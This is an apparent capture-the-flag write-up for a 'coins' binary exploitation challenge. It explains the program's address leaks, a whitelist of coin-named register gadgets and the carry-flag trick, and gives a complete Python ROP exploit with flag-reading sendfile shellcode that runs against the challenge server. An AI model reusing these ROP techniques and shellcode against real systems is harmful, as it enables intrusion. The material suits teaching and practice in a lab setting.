# Coins CTF Challenge — Complete Solution

> **Flag:** `NNS{Wh0_co1neD_7H3_t3rm_nUMi5m4tic5?}`

---

## 1. Challenge Overview

You connect to a remote server running the `coins` binary — a **64-bit, statically-linked, position-independent executable (PIE)** written entirely in x86-64 assembly (no C runtime, no libc). The binary:

1. Prints your "starting balance" (a leaked address).
2. Prints the "flag price" as an offset from your balance.
3. Asks a random numismatic question.
4. Reads your "payment" as a stream of bytes.
5. Validates each 8-byte word of your payment against a strict whitelist of coin function addresses.
6. If valid, executes your payment as a **ROP (Return-Oriented Programming) chain**.

---

## 2. Binary Internals

### 2.1 Address Leaks

At startup, the binary:
1. Generates a random value `r12 ∈ [0, 0xfffd8]` using `rdrand`.
2. Calls `mmap` to allocate a new executable page near the binary's `.data` section.
3. Copies the 40-byte **`win`** function to `mmap_base + r12`.
4. Stores the address in BSS as `win_addr`.

It then prints:
```
starting balance:   0x<PIE_BASE>
flag price:         [your_balance] + 0x<win_offset>
```

Where:
- **`PIE_BASE`** = the binary's base ASLR address.
- **`win_offset`** = `win_addr - PIE_BASE` (the relative offset to the `win` function).

> **This is a full address leak!** We know `win_addr = PIE_BASE + win_offset` exactly.

### 2.2 The `win` Function

The 40-byte `win` function (copied to the randomized region) executes a **`sendfile` shellcode**:

```nasm
movabs rbx, 0x67616c662f   ; rbx = "/flag" (as bytes)
push   rbx
mov    rdi, rsp             ; rdi -> "/flag\0\0\0"
xor    esi, esi             ; flags = O_RDONLY
mov    eax, 2               ; syscall: open
syscall                     ; fd = open("/flag", 0)

mov    esi, eax             ; esi = fd (source)
push   1
pop    rdi                  ; rdi = 1 (stdout)
xor    edx, edx             ; offset = NULL
mov    r10b, 0x25           ; count = 37 bytes
mov    eax, 0x28            ; syscall: sendfile (40)
syscall                     ; sendfile(1, fd, NULL, 37)
```

### 2.3 Input Validation — The ROP Chain Setup

The program reads up to **248 bytes (0xf8)** directly into the stack at `rsp`, then runs the `cg` validation loop which verifies each 8-byte word against an explicit whitelist of 32 coin functions. The final word **must** be the address of the `shilling` function.

After validation, the `cd` function:
1. Sets `CF = 1` (via `stc`).
2. Falls through to `glhf`, which executes `ret`.

This `ret` pops our first address from the stack — **starting our ROP chain!**

---

## 3. The Coin Gadgets — A Register Calculator

Every allowed function is a tiny gadget. There are three families:

### ADC (Add-with-Carry) gadgets — build register values
| Coin | Effect | Hex Value |
|------|--------|-----------|
| `croeseid` | `adc r8, 0x1` | bit 0 → r8 |
| `daric` | `adc r9, 0x2` | bit 1 → r9 |
| `siglos` | `adc r10, 0x4` | bit 2 → r10 |
| `karshapana` | `adc r11, 0x8` | bit 3 → r11 |
| `tetradrachm` | `adc r12, 0x10` | bit 4 → r12 |
| `stater` | `adc r13, 0x20` | bit 5 → r13 |
| `obol` | `adc r14, 0x40` | bit 6 → r14 |
| `lepton` | `adc r15, 0x80` | bit 7 → r15 |
| `aureus` | `adc r8, 0x100` | bit 8 → r8 |
| `solidus` | `adc r9, 0x200` | bit 9 → r9 |
| `denarius` | `adc r10, 0x400` | bit 10 → r10 |
| `antoninianus` | `adc r11, 0x800` | bit 11 → r11 |
| `sestertius` | `adc r12, 0x1000` | bit 12 → r12 |
| `florin` | `adc r13, 0x2000` | bit 13 → r13 |
| `sequin` | `adc r14, 0x4000` | bit 14 → r14 |
| `tremissis` | `adc r15, 0x8000` | bit 15 → r15 |
| `dinar` | `adc r8, 0x10000` | bit 16 → r8 |
| `dirham` | `adc r8, 0x20000` | bit 17 → r8 |
| `scudo` | `adc r8, 0x40000` | bit 18 → r8 |
| `thaler` | `adc r8, 0x80000` | bit 19 → r8 |
| `real` | `adc r9, 0x20000` | bit 17 → r9 |
| `piloncitos` | `adc r10, 0x40000` | bit 18 → r10 |
| `koban` | `adc r11, 0x80000` | bit 19 → r11 |

### SUB (Subtract) gadgets — reduce r8 using other registers
| Coin | Effect |
|------|--------|
| `loonie` | `sub r8, r9` |
| `krugerrand` | `sub r8, r10` |
| `sovereign` | `sub r8, r11` |
| `drachma` | `sub r8, r12` |
| `penny` | `sub r8, r13` |
| `nickel` | `sub r8, r14` |
| `dime` | `sub r8, r15` |

### Jump gadgets — the final step
| Coin | Effect |
|------|--------|
| `quarter` | `lea rax, [rip+0x532]` → `rax = PIE_BASE + 0x1a26` |
| `cent` | `add rax, r8` |
| `shilling` | `jmp rax` |

---

## 4. Exploit Strategy

### 4.1 Goal

We need to execute:
```
quarter  → rax = PIE_BASE + 0x1a26
cent     → rax = rax + r8
shilling → jmp rax
```
so that `rax = win_addr = PIE_BASE + win_offset`.

This means: **`r8 = win_offset - 0x1a26`**

### 4.2 The Carry Flag Problem

The very first gadget in our chain is hit with **`CF = 1`** (set by `stc` in `cd`). All `adc` instructions add `CF` on top of their value, so the first coin gets an extra `+1`.

**Solution:** Place **`loonie`** first. At this point `r9 = 0`, so:
```
sub r8, r9  →  r8 -= 0  (no change to r8)
```
The `sub` instruction **clears `CF`** on no-borrow. This kills the carry flag cleanly, and all subsequent `adc` instructions see `CF = 0`. It costs only 1 gadget slot.

### 4.3 Encoding the Target in r8

After the CF kill, we have **26 gadget slots** (plus `quarter`, `cent`, `shilling` = 29 total, well under the 31-slot limit).

r8 can be directly incremented only at bits **{0, 8, 16, 17, 18, 19}**. For all other bits, we use the **"overshoot and subtract"** technique:

**Example:** We need `r8 = 0x56` (bits 1, 2, 4, 6 are set — none directly settable in r8).
1. Add `aureus` → `r8 += 0x100` (overshoot).
2. Build `0x100 - 0x56 = 0xAA` = `0x80 + 0x20 + 0x8 + 0x2` in the sub-registers:
   - `lepton` → `r15 += 0x80`
   - `stater` → `r13 += 0x20`
   - `karshapana` → `r11 += 0x8`
   - `daric` → `r9 += 0x2`
3. Subtract: `dime`, `penny`, `sovereign`, `loonie`.
4. Net: `r8 = 0x100 - 0xAA = 0x56`. ✓

The same pattern works for bits 9–15 (using a `dinar` = 0x10000 overshoot).

### 4.4 Full Chain Example (from actual exploit run)

For `win_offset = 0x96960`, `r8_target = 0x94f3a`:

```
loonie       ; CF kill (r8 -= r9=0)
thaler       ; r8  += 0x80000
dinar        ; r8  += 0x10000  (first pass, bits 16+)
aureus       ; r8  += 0x100
tremissis    ; r15 += 0x8000
florin       ; r13 += 0x2000
sestertius   ; r12 += 0x1000
solidus      ; r9  += 0x200
dinar        ; r8  += 0x10000  (overshoot for bits 9-15)
lepton       ; r15 += 0x80
obol         ; r14 += 0x40
siglos       ; r10 += 0x4
daric        ; r9  += 0x2
aureus       ; r8  += 0x100   (overshoot for bits 1-7)
dime         ; r8  -= r15
penny        ; r8  -= r13
drachma      ; r8  -= r12
loonie       ; r8  -= r9      (second use, r9 has value now)
nickel       ; r8  -= r14
krugerrand   ; r8  -= r10
quarter      ; rax = PIE_BASE + 0x1a26
cent         ; rax += r8
shilling     ; jmp rax  →  WIN!
```

---

## 5. Complete Exploit Script

```python
import socket, ssl, struct, re, time

OFFSETS = {
    'croeseid': 0x142e, 'daric': 0x1433, 'siglos': 0x1438,
    'karshapana': 0x143d, 'tetradrachm': 0x1442, 'stater': 0x1447,
    'obol': 0x144c, 'lepton': 0x1451, 'aureus': 0x1459,
    'solidus': 0x1461, 'denarius': 0x1469, 'antoninianus': 0x1471,
    'sestertius': 0x1479, 'florin': 0x1481, 'sequin': 0x1489,
    'tremissis': 0x1491, 'dinar': 0x1499, 'dirham': 0x14a1,
    'scudo': 0x14a9, 'thaler': 0x14b1, 'real': 0x14b9,
    'piloncitos': 0x14c1, 'koban': 0x14c9, 'loonie': 0x14d1,
    'krugerrand': 0x14d5, 'sovereign': 0x14d9, 'drachma': 0x14dd,
    'penny': 0x14e1, 'nickel': 0x14e5, 'dime': 0x14e9,
    'quarter': 0x14ed, 'cent': 0x14f5, 'shilling': 0x14f9,
}
COIN_EFFECTS = {
    'croeseid': ('r8',0x1,True), 'daric': ('r9',0x2,False),
    'siglos': ('r10',0x4,False), 'karshapana': ('r11',0x8,False),
    'tetradrachm': ('r12',0x10,False), 'stater': ('r13',0x20,False),
    'obol': ('r14',0x40,False), 'lepton': ('r15',0x80,False),
    'aureus': ('r8',0x100,True), 'solidus': ('r9',0x200,False),
    'denarius': ('r10',0x400,False), 'antoninianus': ('r11',0x800,False),
    'sestertius': ('r12',0x1000,False), 'florin': ('r13',0x2000,False),
    'sequin': ('r14',0x4000,False), 'tremissis': ('r15',0x8000,False),
    'dinar': ('r8',0x10000,True), 'dirham': ('r8',0x20000,True),
    'scudo': ('r8',0x40000,True), 'thaler': ('r8',0x80000,True),
    'real': ('r9',0x20000,False), 'piloncitos': ('r10',0x40000,False),
    'koban': ('r11',0x80000,False),
}
SUB_GADGETS = {'r9':'loonie','r10':'krugerrand','r11':'sovereign',
               'r12':'drachma','r13':'penny','r14':'nickel','r15':'dime'}
R8_ADD_COINS = {v: k for k,(r,v,is_r8) in COIN_EFFECTS.items() if is_r8}

def find_coin(reg, val):
    for n,(r,v,_) in COIN_EFFECTS.items():
        if r==reg and v==val: return n

def build_r8(target, budget=26):
    if target < 0: return None
    coins, sub_regs, r8_total, T = [], {}, 0, target
    for bv in [0x80000, 0x40000, 0x20000, 0x10000]:
        while T >= bv and len(coins) < budget:
            coins.append(R8_ADD_COINS[bv]); r8_total += bv; T -= bv
    hn = T & 0xFF00
    if hn & 0x100: coins.append('aureus'); r8_total += 0x100; T -= 0x100; hn -= 0x100
    if hn:
        ov = 0x10000 - hn
        for reg,v in [('r15',0x8000),('r14',0x4000),('r13',0x2000),
                      ('r12',0x1000),('r11',0x800),('r10',0x400),('r9',0x200)]:
            c = ov//v
            if c: sub_regs[reg]=sub_regs.get(reg,0)+v*c; ov-=v*c
            for _ in range(c): coins.append(find_coin(reg,v))
        if ov: return None
        coins.append('dinar'); r8_total += 0x10000; T -= hn
    lb = T & 0xFF
    if lb & 1: coins.append('croeseid'); r8_total += 1; T -= 1; lb -= 1
    if lb:
        ov = 0x100 - lb
        for reg,v in [('r15',0x80),('r14',0x40),('r13',0x20),
                      ('r12',0x10),('r11',0x8),('r10',0x4),('r9',0x2)]:
            c = ov//v
            if c: sub_regs[reg]=sub_regs.get(reg,0)+v*c; ov-=v*c
            for _ in range(c): coins.append(find_coin(reg,v))
        if ov: return None
        coins.append('aureus'); r8_total += 0x100; T -= lb
    for reg in sub_regs: coins.append(SUB_GADGETS[reg])
    r8_final = r8_total - sum(sub_regs.values())
    if r8_final != target or len(coins) > budget: return None
    return coins

def try_exploit():
    HOST = 'coins-c0e5d8bb33fa.chall.nnsc.tf'
    raw = socket.create_connection((HOST, 1337), timeout=10)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    data = b''
    sock.settimeout(5)
    try:
        while b'>' not in data:
            data += sock.recv(4096)
    except: pass
    text = data.decode(errors='replace')
    bal = re.search(r'starting balance:\s*0x([0-9a-f]+)', text)
    price = re.search(r'\+ 0x([0-9a-f]+)', text)
    if not bal or not price: sock.close(); return None
    pie_base = int(bal.group(1), 16)
    win_offset = int(price.group(1), 16)
    r8_target = win_offset - 0x1a26
    coins = build_r8(r8_target)
    if coins is None: sock.close(); return None
    chain = ['loonie'] + coins + ['quarter', 'cent', 'shilling']
    payload = b''.join(struct.pack('<Q', pie_base + OFFSETS[c]) for c in chain)
    sock.send(payload)
    time.sleep(1); resp = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk: break
            resp += chunk
    except: pass
    sock.close()
    m = re.search(rb'NNS\{[^}]+\}', resp)
    return m.group().decode() if m else None

for i in range(5):
    flag = try_exploit()
    if flag: print(f"\n[+] FLAG: {flag}"); break
    time.sleep(1)
```

---

## 6. Key Takeaways

| Concept | Applied Here |
|---------|-------------|
| **PIE/ASLR** | Bypassed entirely via explicit leaks printed by the program |
| **ROP (Return-Oriented Programming)** | Input lands on stack; `ret` chains through our coin gadgets |
| **Carry Flag (CF) manipulation** | `stc` before `ret` sets CF=1; we use `loonie` (sub r8,r9) to clear it |
| **Arithmetic with restricted gadgets** | Overshoot-and-subtract technique: add a larger power-of-2 to r8, then subtract the difference using other registers |
| **Repeated gadget use** | The same coin address can appear multiple times in the chain |
| **sendfile shellcode** | The `win` function uses `sendfile(stdout, fd, NULL, 37)` — no write syscall needed |
